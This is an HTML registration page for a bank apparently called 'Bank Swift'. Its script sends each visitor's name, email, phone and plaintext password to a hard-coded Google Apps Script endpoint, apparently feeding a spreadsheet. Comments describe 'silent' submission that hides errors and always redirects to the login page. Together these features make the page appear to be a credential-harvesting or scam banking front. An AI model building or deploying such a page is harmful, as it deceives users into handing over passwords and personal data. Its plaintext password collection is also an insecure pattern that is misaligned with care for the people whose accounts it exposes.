<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
  <title>Register â€¢ Bank Swift</title>
  <link rel="icon" href="bank-swift.png" type="image/png" />
  <link rel="apple-touch-icon" href="bank-swift.png" />
  <link rel="shortcut icon" href="bank-swift.png" type="image/png" />
  <link rel="stylesheet" href="ui.css" />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
  <script src="common.js"></script>
</head>
<body>
  <div class="hero-background"></div>
  <div class="particles" id="particles"></div>
  <main class="auth-wrapper">
    <section class="auth-card" aria-labelledby="regTitle">
      <div class="auth-head">
        <div class="auth-logo" aria-hidden="true">
          <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
            <defs>
              <linearGradient id="logoGrad1" x1="0%" y1="0%" x2="100%" y2="100%">
                <stop offset="0%" stop-color="#667eea"/>
                <stop offset="60%" stop-color="#764ba2"/>
                <stop offset="100%" stop-color="#8b5cf6"/>
              </linearGradient>
              <linearGradient id="logoGrad2" x1="0%" y1="0%" x2="100%" y2="0%">
                <stop offset="0%" stop-color="#06b6d4"/>
                <stop offset="100%" stop-color="#4facfe"/>
              </linearGradient>
              <linearGradient id="logoGrad3" x1="0%" y1="100%" x2="100%" y2="0%">
                <stop offset="0%" stop-color="#f093fb" stop-opacity="0.8"/>
                <stop offset="100%" stop-color="#f5576c" stop-opacity="0.8"/>
              </linearGradient>
            </defs>
            <path fill="url(#logoGrad1)" d="M6 10 L34 32 L6 54 Z"/>
            <path fill="url(#logoGrad2)" d="M34 10 L58 32 L34 54 L22 44 L34 32 L22 20 Z"/>
            <path fill="url(#logoGrad3)" d="M6 10 L34 32 L22 44 L6 54 Z" opacity="0.35"/>
          </svg>
        </div>
        <h1 class="auth-title" id="regTitle">Create your account</h1>
        <p class="auth-sub">Join the future of digital banking in seconds</p>
      </div>
      <div id="regAlert" class="alert-auth" role="alert"></div>
      <form id="registerForm" class="form-grid" novalidate autocomplete="off">
        <div class="form-row-2">
          <div class="field">
            <label for="fullname">Full Name</label>
            <input class="input-base" id="fullname" name="fullname" placeholder="Jane Doe" required />
          </div>
          <div class="field">
            <label for="phone">Phone (optional)</label>
            <input class="input-base" id="phone" name="phone" inputmode="tel" placeholder="+1 555 123 4567" />
          </div>
        </div>
        <div class="field">
          <label for="email">Email</label>
          <input class="input-base" type="email" id="email" name="email" autocomplete="email" placeholder="you@example.com" required />
        </div>
        <div class="field">
          <label for="password">Password</label>
          <div class="pw-wrap">
            <input class="input-base" type="password" id="password" name="password" minlength="6" placeholder="Minimum 6 characters" required />
            <button type="button" class="pw-toggle" id="pwToggleRegister" aria-label="Show password">Show</button>
          </div>
        </div>
        <button type="submit" class="btn-full" id="registerBtn">Create Account</button>
      </form>
  <div class="auth-alt">Already have an account? <a href="login.html">Sign in</a></div>
    </section>
  </main>

  <script>
    // Your Google Apps Script web app URL
    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxznREHKJnObwEbXQ6xInlEQSsk1R82AA_YfKbyF8X0pQEPbS6TCdrECg94FVGlpL_o/exec';

    function showAlert(msg, type = 'error') { 
      const el = document.getElementById('regAlert'); 
      el.textContent = msg; 
      el.className = `alert-auth ${type} show`; 
    }
    
    function clearAlert() { 
      const el = document.getElementById('regAlert'); 
      el.textContent=''; 
      el.className='alert-auth'; 
    }

    // Clear form on load
    document.addEventListener('DOMContentLoaded', () => {
      ['fullname','phone','email','password'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.value = '';
      });
    });

    document.getElementById('registerForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      clearAlert();

      const btn = document.getElementById('registerBtn');
      const originalText = btn.textContent;
      btn.disabled = true;
      btn.innerHTML = 'Creating account <span class="spinner"></span>';

      const fullname = document.getElementById('fullname').value.trim();
      const phone = document.getElementById('phone').value.trim();
      const email = document.getElementById('email').value.trim().toLowerCase();
      const passwordInput = document.getElementById('password');
      const password = passwordInput.value;

      // Basic validation
      if (!fullname || !email || !password) {
        showAlert('Please fill all required fields.');
        btn.disabled = false;
        btn.textContent = originalText;
        return;
      }

      if (password.length < 6) {
        showAlert('Password must be at least 6 characters.');
        btn.disabled = false;
        btn.textContent = originalText;
        return;
      }

      if (!email.includes('@')) {
        showAlert('Please enter a valid email address.');
        btn.disabled = false;
        btn.textContent = originalText;
        return;
      }

      try {
        // Create new user record
        const nowISO = new Date().toISOString();
        const newUser = {
          formType: 'Registration',
          date: nowISO,
          fullname: fullname,
          email: email,
          phone: phone,
          password: password,
          baseAvailable: 0,
          totalBalance: 0
        };

        console.log('Submitting registration:', { ...newUser, password: '[HIDDEN]' });

        // Submit to Google Sheets via Apps Script with timeout
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 15000); // 15 second timeout
        
        const response = await fetch(SCRIPT_URL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(newUser),
          mode: 'cors',
          signal: controller.signal
        });
        
        clearTimeout(timeoutId);

        console.log('Response status:', response.status, response.statusText);
        
        if (!response.ok) {
          throw new Error(`HTTP ${response.status}: ${response.statusText}`);
        }

        const result = await response.json();
        console.log('Response data:', result);
        
        if (!result.success) {
          // Silent mode - log but don't show error to user
          console.warn('Sheet submission failed:', result.message);
        }
        
        // Continue to redirect regardless of API response

      } catch (err) {
        console.error('Registration error (silent):', err);
        // Silent submission - proceed to redirect regardless of errors
      }
      
      // Always redirect after 3 seconds, regardless of success/failure
      window.__LAST_REG_ROW__ = {
        formType: 'Registration',
        date: new Date().toISOString(),
        fullname: fullname,
        email: email,
        phone: phone
      };
      
      // Persist email + flash for login page prefill/message
      try {
        localStorage.setItem('bs-last-registered-email', email);
        sessionStorage.setItem('bs-flash', 'Registration submitted. Please sign in with your credentials.');
      } catch {}
      
      btn.textContent = 'Redirecting to login...';
      
      setTimeout(() => {
        window.location.href = 'login.html';
      }, 3000);
    });

    // Password visibility toggle
    (function(){ 
      const btn=document.getElementById('pwToggleRegister'); 
      const input=document.getElementById('password'); 
      if(!btn||!input) return; 
      btn.addEventListener('click',()=>{ 
        const type=input.getAttribute('type')==='password'?'text':'password'; 
        input.setAttribute('type', type); 
        btn.textContent= type==='password'?'Show':'Hide'; 
        btn.setAttribute('aria-label', (type==='password'?'Show':'Hide')+ ' password'); 
      }); 
    })();

    // Particles creation
    (function makeParticles(){ 
      const c=document.getElementById('particles'); 
      if(!c) return; 
      for(let i=0;i<48;i++){ 
        const p=document.createElement('span'); 
        p.className='particle'; 
        p.style.left=Math.random()*100+'%'; 
        p.style.animationDelay=(Math.random()*16)+'s'; 
        p.style.opacity=Math.random().toString(); 
        c.appendChild(p);
      } 
    })();
  </script>
</body>
</html>